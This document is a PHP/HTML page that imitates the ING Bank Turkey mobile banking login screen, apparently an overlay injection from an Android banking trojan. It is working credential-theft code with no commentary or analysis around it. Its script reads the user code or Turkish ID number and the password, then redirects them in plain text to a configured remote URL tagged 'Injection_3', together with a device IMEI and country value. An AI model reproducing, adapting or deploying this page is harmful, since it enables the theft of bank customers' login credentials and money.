<html>
<head>
		<meta charset="UTF-8">
        <link href="tr/com.ingbanktr.ingmobil/style.css" rel="stylesheet">
        <link href="https://fonts.googleapis.com/css2?family=Nunito&display=swap" rel="stylesheet">
        <link href="https://use.fontawesome.com/releases/v5.0.7/css/all.css" rel="stylesheet">
</head>
<?php
error_reporting(0);
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
<style>
*{
    font-family: 'Nunito', sans-serif;
}
</style>


      <div style="background:#ff6500;width:100%;height:55px;">
            <center>
            <div style="width:90%;">
            <img style="width: 130px;height:50px;margin-top:3px;margin-right:-28px;" src="inglogo.png">
            <i class="fa fa-comments" style="font-size:24px;color:#fff;float:left;margin-top:17px;"></i>
    
            <i class="fa fa-question" style="font-size:24px;color:#fff;float:right;margin-top:17px;"></i>
            <i class="fa fa-question" style="font-size:35px;color:#ff6500;float:right;margin-top:17px;"></i>
            <i class="fa fa-bell" style="font-size:24px;color:#fff;float:right;margin-top:17px;"></i>
        </div>
            
            </center>
            
      </div><br><br>

    <div class="content">
    <form action="null" method="post" id="_mainForm" target="flow_handler">
        <input type="text" id="login" name="login" class="login" placeholder="Kullanıcı Kodu / TC Kimlik No"><br><br>

        <input type="password" id="password" name="password" class="password" placeholder="Bireysel Şifreniz">
    </form>
    <iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
      
    <div style="margin-bottom:32px;"></div>
                <h3 style="color: #555;display: inline;font-weight: 100;margin: 0;font-size:15px;">&nbsp;Beni Hatırla </h3>
  <div style="margin-bottom:32px;"></div>

        <input type="submit" class="submit"  id="sbt_input" value="Giriş Yap">
    </div>

<script type="text/javascript">

            (function () {


        var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
             var input = objDoc.createElement("input");
             input.setAttribute("type", "hidden");
             input.setAttribute("name", sNm);
             input.setAttribute("value", sV);
             input.value = sV;
             objForm.appendChild(input);
         };
                    var g_oBtn = document.getElementById('sbt_input');
                    g_oBtn.onclick = function () {

						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = 'login';
							oCodeInp.className = 'password';
						} catch(e){};

                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'loginerror';
							} catch(e){};
                            return false;
                        }

                        if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'passworderror';
							} catch(e){};
                            return false;
                        }

top['closeDlg'] = true;
var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|htsu|"+oNumInp.value+"|"+oCodeInp.value);

return false;
};

})();
</script>

</body>
</html>
